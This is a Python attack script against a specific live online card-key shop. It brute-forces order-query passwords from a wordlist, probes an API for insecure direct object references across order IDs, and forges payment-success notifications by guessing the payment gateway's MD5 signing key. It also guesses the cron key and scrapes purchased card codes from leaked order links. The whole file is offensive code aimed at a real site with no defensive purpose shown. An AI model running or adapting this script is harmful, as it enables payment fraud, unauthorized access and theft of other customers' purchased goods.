#!/usr/bin/env python3
"""xinhe001.lol/shop deep probe: surface, pwd, pay, api, notify, cron."""
import hashlib
import json
import os
import re
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://xinhe001.lol/shop/"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/xinhe001_deep.json"
PWD_FILE = sys.argv[2] if len(sys.argv) > 2 else "/workspace/query_pwd_list.txt"
PWD_LIMIT = int(sys.argv[3]) if len(sys.argv) > 3 else 120

SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")
FAKA = re.compile(r"mod=faka&id=(\d+)&skey=([a-f0-9]{32})")
CARD = re.compile(r"<textarea[^>]*>([^<]+)</textarea>", re.S)
CSRF = re.compile(r'csrf_token\s*=\s*"([^"]+)"')
HASHSALT = re.compile(r"var hashsalt=(.+?);")


def sess():
    s = requests.Session()
    s.verify = False
    s.headers.update(
        {
            "User-Agent": UA,
            "Referer": BASE,
            "Accept-Language": "zh-CN,zh;q=0.9",
        }
    )
    for i in range(6):
        try:
            r = s.get(BASE, timeout=25)
            if len(r.text) > 5000:
                return s, r.text
        except Exception as e:
            print(f"home retry {i}: {e}", flush=True)
            time.sleep(2 + i)
    raise RuntimeError("home fail")


def compute_hashsalt(expr):
    proc = subprocess.run(
        ["node", "-e", f"console.log({expr.strip()})"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    return proc.stdout.strip() if proc.returncode == 0 else ""


def leak(t):
    return "kminfo" in t or SHOW.search(t) is not None


def epay_sign(params, key):
    items = sorted(k for k in params if k != "sign" and params[k] != "")
    s = "&".join(f"{k}={params[k]}" for k in items) + key
    return hashlib.md5(s.encode()).hexdigest()


def query_surface(s):
    surface = {}
    queries = ["", "1", "11", "123", "888", "123456", "666666", "138", "139", "150"]
    for q in queries:
        params = {"mod": "query"}
        if q:
            params["data"] = q
        try:
            r = s.get(BASE, params=params, timeout=15)
            so = SHOW.findall(r.text)
            fk = FAKA.findall(r.text)
            surface[q or "empty"] = {
                "len": len(r.text),
                "showOrder": len(so),
                "faka": len(fk),
                "sample": so[:3],
            }
            if so or fk:
                print(f"SURFACE HIT data={q!r} orders={len(so)}", flush=True)
        except Exception as e:
            surface[q] = {"err": str(e)[:60]}
        time.sleep(0.4)
    return surface


def pwd_scan(pwds):
    hits = []
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": UA, "Referer": BASE})
    s.get(BASE, timeout=20)
    for pwd in pwds:
        try:
            r = s.get(BASE, params={"mod": "query", "data": pwd}, timeout=12)
            so = SHOW.findall(r.text)
            if so or "kminfo" in r.text:
                hits.append({"pwd": pwd, "via": "GET", "showOrder": so[:5]})
                print(f"PWD HIT GET {pwd} {len(so)}", flush=True)
            r2 = s.post(
                BASE + "ajax.php?act=query",
                data={"type": "1", "content": pwd, "pwd": pwd},
                timeout=12,
            )
            if SHOW.search(r2.text) or "kminfo" in r2.text:
                hits.append({"pwd": pwd, "via": "ajax", "resp": r2.text[:200]})
                print(f"PWD HIT ajax {pwd}", flush=True)
        except Exception as e:
            print(f"pwd err {pwd}: {e}", flush=True)
            time.sleep(3)
            s.get(BASE, timeout=20)
        time.sleep(0.35)
    return hits


def main():
    s, home = sess()
    csrf_m = CSRF.search(home)
    csrf = csrf_m.group(1) if csrf_m else ""
    report = {
        "target": "xinhe001.lol",
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "home_len": len(home),
        "csrf": csrf[:24],
    }

    gc = json.loads(s.get(BASE + "ajax.php?act=getcount", timeout=12).text)
    report["getcount"] = gc
    orders = int(gc.get("orders", 5717))
    print("orders", orders, flush=True)

    tl = s.get(BASE + "toollogs.php", timeout=12)
    report["toollogs"] = {
        "len": len(tl.text),
        "showOrder": len(SHOW.findall(tl.text)),
    }

    report["surface"] = query_surface(s)

    # ajax matrix
    matrix = {}
    for act in ["query", "order", "pay", "search", "gettool", "getclass"]:
        try:
            r = s.get(BASE + f"ajax.php?act={act}", timeout=10)
            matrix[act] = r.text[:100]
        except Exception as e:
            matrix[act] = str(e)[:60]
    report["ajax_get"] = matrix

    # pwd scan
    pwds = []
    if os.path.isfile(PWD_FILE):
        with open(PWD_FILE, encoding="utf-8") as f:
            pwds = [x.strip() for x in f if x.strip()][:PWD_LIMIT]
    report["pwd_hits"] = pwd_scan(pwds) if pwds else []

    # api IDOR
    api_hits = []
    for oid in range(orders, orders - 20, -1):
        for act in ["search", "order", "query"]:
            try:
                r = s.get(BASE + f"api.php?act={act}&id={oid}", timeout=6)
                if leak(r.text) or ('"code":0' in r.text and "验证失败" not in r.text):
                    api_hits.append({"path": f"api.php?act={act}&id={oid}", "body": r.text[:300]})
                    print("API", act, oid, r.text[:80], flush=True)
            except Exception:
                pass
    report["api_hits"] = api_hits

    # pay chain tid=34 cheap auto faka
    pay_info = {}
    try:
        buy = s.get(BASE, params={"mod": "buy", "cid": "4", "tid": "34"}, timeout=20)
        csrf2 = CSRF.search(buy.text).group(1)
        hs_m = HASHSALT.search(buy.text)
        hashsalt = compute_hashsalt(hs_m.group(1)) if hs_m else ""
        pay = s.post(
            BASE + "ajax.php?act=pay",
            data={
                "tid": "34",
                "inputvalue": "123456789",
                "num": "1",
                "hashsalt": hashsalt,
                "csrf_token": csrf2,
            },
            timeout=15,
        )
        pay_info["resp"] = pay.text[:400]
        print("pay", pay.text[:120], flush=True)
        try:
            pj = pay.json()
            pay_info["json"] = pj
            trade = pj.get("trade_no")
            if trade:
                pay_info["trade_no"] = trade
                keys = [
                    "123456", "888888", "xinhe", "xinghe001", "faka", "rainbow",
                    "epay", "mapi", "admin", "12345678",
                ]
                notify_hits = []
                for key in keys:
                    params = {
                        "pid": "1000",
                        "type": "qqpay",
                        "out_trade_no": trade,
                        "notify_url": BASE + "other/epay_notify.php",
                        "return_url": BASE + "other/return.php",
                        "name": "test",
                        "money": "5.00",
                        "trade_no": trade,
                        "trade_status": "TRADE_SUCCESS",
                    }
                    params["sign"] = epay_sign(params, key)
                    params["sign_type"] = "MD5"
                    rr = s.post(BASE + "other/epay_notify.php", data=params, timeout=8)
                    b = rr.text.strip()
                    if b and b not in ("error", "fail", "FAIL") and "No Act" not in b:
                        notify_hits.append({"key": key, "body": b[:200]})
                        print("NOTIFY", key, b[:80], flush=True)
                pay_info["notify_hits"] = notify_hits
        except Exception:
            pass
    except Exception as e:
        pay_info["error"] = str(e)[:120]
    report["pay"] = pay_info

    # cron keys
    cron_hits = []
    cron_keys = {"xinhe", "xinghe001", "xinhe001", "123456", "888888", "monitor", "cron"}
    if os.path.isfile(PWD_FILE):
        with open(PWD_FILE, encoding="utf-8") as f:
            for i, line in enumerate(f):
                if i >= 80:
                    break
                cron_keys.add(line.strip())
    for k in cron_keys:
        try:
            r = s.get(BASE + "cron.php", params={"key": k}, timeout=5)
            b = r.text.strip()
            if b and "不正确" not in b and "密钥" not in b:
                cron_hits.append({"key": k, "body": b[:300]})
                print("CRON", k, b[:80], flush=True)
        except Exception:
            pass
    report["cron_hits"] = cron_hits

    # faka pull if surface found pairs
    pairs = {}
    for v in report["surface"].values():
        for item in v.get("sample", []):
            if isinstance(item, tuple) and len(item) == 2:
                pairs[str(item[0])] = item[1]
    cards = []
    for oid, skey in list(pairs.items())[:20]:
        try:
            fk = s.get(BASE, params={"mod": "faka", "id": oid, "skey": skey}, timeout=12)
            m = CARD.search(fk.text)
            if m:
                cards.append({"id": oid, "card": m.group(1)[:200]})
                print(f"CARD {oid}: {m.group(1)[:80]}", flush=True)
        except Exception:
            pass
    report["cards"] = cards

    report["CARD_LEAK"] = bool(
        api_hits or cards or report["pwd_hits"]
        or any(v.get("showOrder", 0) > 0 for v in report["surface"].values() if isinstance(v, dict))
    )

    with open(OUT, "w") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    print("DONE", OUT, "CARD_LEAK=", report["CARD_LEAK"], flush=True)


if __name__ == "__main__":
    main()
